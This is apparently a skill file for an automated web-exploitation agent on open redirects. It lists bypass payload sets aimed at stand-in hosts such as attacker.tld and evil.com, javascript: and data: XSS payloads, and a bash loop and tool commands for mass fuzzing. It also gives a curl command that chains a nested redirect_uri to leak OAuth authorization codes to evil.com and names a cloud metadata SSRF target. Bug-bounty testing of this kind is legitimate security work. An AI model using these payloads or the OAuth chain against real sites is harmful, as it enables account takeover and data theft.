---
name: "Open Redirect"
description: "Detect and confirm open redirects via canary-host Location-header oracle, with the full bypass payload set (protocol-relative, backslash, userinfo @, whitelisted-host tricks). Chains to OAuth token theft and SSRF."
tags: ["open_redirect", "ssrf"]
recommended_tools: ["curl", "ffuf"]
vuln_classes: ["open_redirect", "ssrf"]
domain: web
phase: exploitation
---
# Open Redirect

Maps to vuln_classes: open_redirect (and ssrf when the redirect is followed server-side).

## Where to look
Redirect/return params: `?next=`, `?url=`, `?redirect=`, `?redirect_uri=`, `?return=`, `?returnUrl=`, `?continue=`, `?dest=`, `?destination=`, `?r=`, `?u=`, `?target=`, `?goto=`, `?out=`, `?view=`, `?image_url=`, `?callback=`. Also login/logout flows and OAuth `redirect_uri`.

## Payload ladder: detect -> confirm -> escalate
Rewrite the param to a unique canary host and follow redirects manually (`curl -i -s`, do NOT use `-L`).
```
?next=//attacker.tld
?next=https://attacker.tld
?next=https:attacker.tld            (missing slashes)
?next=/\attacker.tld                (backslash-slash)
?next=\\attacker.tld
?next=//attacker.tld/%2e%2e
?next=https://legit.tld@attacker.tld     (userinfo confusion)
?next=https://legit.tld.attacker.tld     (suffix domain)
?next=https://attacker.tld#@legit.tld    (fragment trick)
?next=https://attacker.tld%00.legit.tld  (null byte)
?next=////attacker.tld
?next=javascript:alert(document.domain)  (DOM/JS sink -> XSS, not just redirect)
?next=data:text/html,<script>alert(1)</script>
```
Whitelist bypasses when the app checks for its own domain substring:
```
https://attacker.tld/legit.tld        https://attacker.tld?legit.tld
https://legit.tld.attacker.tld        https://attacker.tld#legit.tld
```

## Deterministic proof signal
HTTP 3xx response whose `Location:` header contains the EXACT injected canary hostname as the redirect target (not merely in a query string). For `javascript:`/`data:` schemes landing in a client-side `location=` sink, confirm script execution in a real browser. Send a benign control twin (the app's own path) to prove the redirect is attacker-controlled, not a fixed redirect.

## Chaining (this is where severity comes from)
- OAuth `redirect_uri` open redirect -> auth code / token leaked to attacker host -> account takeover. Test exact-match allowlist enforcement on `redirect_uri`.
- Redirect -> SSRF when the server fetches the redirect target.
- Redirect chained with a trusted-domain CSP/cookie scope to defeat origin checks.

CWE-601 (URL Redirection to Untrusted Site).

## Modern techniques & real-world CVEs (via recon-skills)

### Disclosed report patterns (HackerOne, ~28 reports)
- **OAuth `redirect_uri` wildcard + dangling subdomain -> 1-click ATO.** A platform accepted `redirect_uri` matching `*.corp.com`. Attacker claimed a dangling subdomain (`support.corp.com`) and used `redirect_uri=https://support.corp.com/oauth-callback` to catch the auth code of any user who clicked, then exchanged it for a token. Always enumerate subdomains of the allowlisted apex for takeover candidates when the OAuth allowlist is a wildcard/suffix match, not exact.
- **Logout redirect inside a password-reset email -> session hijack.** Reset email contained `https://target.com/logout?redirect_to=<url>`. The param accepted `https://evil.com`; after the victim reset their password they landed on the attacker host with a live session cookie. Look for redirect params embedded in *transactional emails* (reset, verify, invite) — they are attacker-tamperable when the link travels through email/MitM.

### Additional attack-surface params & flows
Beyond the classic set, hunt e-commerce/payment redirects: `?checkout_url=`, `?success_url=`, `?cancel_url=`, `?returnTo=`, `?forward=`, `?location=`, `?go=`, `?redir=`, `?jump=`, `?link=`. Flows: `/logout?returnTo=`, `/login?next=`, `/sso?callback=`, language switchers.

### Root-cause taxonomy (where validation actually fails)
1. **Existence-only checks** — app verifies the redirect param is *present*/known-named, never validates its value.
2. **Loose OAuth/SAML matching** — library configured with prefix/suffix/wildcard `redirect_uri` match instead of exact string equality.
3. **Host-header-derived redirect** — SSO builds `Location` from the request `Host:`; inject `Host: evil.com` for a header-based open redirect (no engine key — overlaps host-header class).
4. **GET-validated, POST-unvalidated** — JSON/POST redirect params frequently skip the validation GET paths enforce. Re-test the same param over POST.
5. **Parser disagreement on URL terminators** — newline/CR (`%0d%0a`), fragment (`#`), and userinfo (`@`) split the URL differently across the validator vs the browser.

### Newer bypass rungs (add to the ladder)
```
?next=%2Fevil.com                       (URL-encoded leading slash)
?next=evil.com%09                        (tab whitespace) / evil.com%20
?next=evil.com%00target.com              (null-byte truncation of allowlist suffix)
?next=//evil.com/%2F..                   (double-slash + encoded traversal)
?next=https://evil.com%23.target.com     (encoded-fragment suffix trick)
?next=https:/\evil.com                   (mixed slash/backslash)
```
CRLF variant: if `%0d%0a` survives into the `Location:` line, you have header injection in addition to redirect.

### Modern tooling & automation
```bash
# Discover redirect candidates from a URL corpus
cat urls.txt | gf redirect > redirect-candidates.txt

# Mass-test with qsreplace, no auto-follow, capture Location
cat redirect-candidates.txt | qsreplace "https://evil.com" | while read u; do
  loc=$(curl -s -I --max-redirs 0 "$u" | grep -i '^location:')
  [ -n "$loc" ] && echo "$loc  <-  $u"
done

# openredirex — payload-fuzzes each candidate with the bypass set
pip3 install openredirex
openredirex -l redirect-candidates.txt -p evil.com

# nuclei redirect templates
nuclei -u https://target -t http/exposures/ -tags redirect -severity medium,high
```
`--max-redirs 0` (never `-L`) so the raw `Location:` is observable and the canary is not silently followed.

### OAuth chain proof (nested open redirect as redirect_uri)
```bash
# redirect_uri points at target's own open-redirect endpoint -> auth code exfil
curl -sv "https://target.com/oauth/authorize?response_type=code&client_id=ID\
&redirect_uri=https%3A%2F%2Ftarget.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fevil.com" \
  2>&1 | grep -i 'location:'
```
Nesting an on-domain open redirect inside `redirect_uri` defeats exact-match allowlists that only pin the *host*, not the full path — the code lands on `target.com` then bounces to `evil.com` with the code in the URL.

### Severity gate (report discipline)
Standalone open redirect is Low on most programs — file at High/Critical only with a demonstrated chain: OAuth code theft -> ATO, session fixation via logout redirect, or server-side-followed redirect -> SSRF (`http://169.254.169.254/latest/meta-data/`).
